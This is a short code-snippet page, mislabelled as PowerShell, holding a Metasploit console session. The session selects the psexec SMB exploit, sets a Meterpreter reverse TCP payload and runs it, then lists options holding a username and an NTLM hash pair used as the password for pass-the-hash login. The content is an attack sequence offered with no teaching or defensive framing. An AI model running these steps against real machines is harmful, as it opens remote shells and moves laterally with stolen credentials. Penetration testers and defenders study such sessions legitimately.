---
id: c1d8e1e2-2b3e-479d-932a-70f43e35cdf8
type: code
language: Powershell
verified: false
created_at: '2023-04-06T03:56:21.590816+00:00'
updated_at: '2023-04-10T20:25:00.057041+00:00'
---

# Code Snippet c1d8e1e2

**Language**: Powershell

```powershell
msf > use exploit/windows/smb/psexec
msf exploit(psexec) > set payload windows/meterpreter/reverse_tcp
msf exploit(psexec) > exploit
SMBDomain             WORKGROUP                                                          yes       The Windows domain to use for authentication
SMBPass               598ddce2660d3193aad3b435b51404ee:2d20d252a479f485cdf5e171d93985bf  yes       The password for the specified username
SMBUser               Lambda                                                             yes       The username to authenticate as
```
